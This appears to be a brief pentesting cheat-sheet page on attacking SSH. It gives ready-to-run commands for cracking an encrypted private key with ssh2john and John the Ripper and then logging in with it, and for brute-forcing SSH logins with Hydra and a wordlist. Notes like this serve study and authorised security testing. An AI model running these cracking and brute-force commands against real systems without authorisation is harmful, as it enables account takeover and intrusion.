# SSH

The [Secure Shell](https://en.wikipedia.org/wiki/Secure_Shell) Protocol is a cryptographic network protocol for operating network services securely over an unsecured network.

## John the Ripper

[John the Ripper] is a fast password cracker. Its primary purpose is to detect weak Unix passwords. You can use it to crack encrypted RSA keys.

```bash
# format the key to johns format

ssh2john ssh.key > ssh.hash

# crack the hash

john --wordlist=$WORDLIST ssh.hash

# set permissions and log in using the rsa key

chmod 600 ssh.key

ssh -i ssh.key user@host
```
## Hydra

[Hydra](https://github.com/vanhauser-thc/thc-hydra) is a parallelized login cracker which supports numerous protocols to attack. You can use it to bruteforce SSH login.

```bash
hydra -t 16 -l $USER -P $WORDLIST -vV $IP ssh
```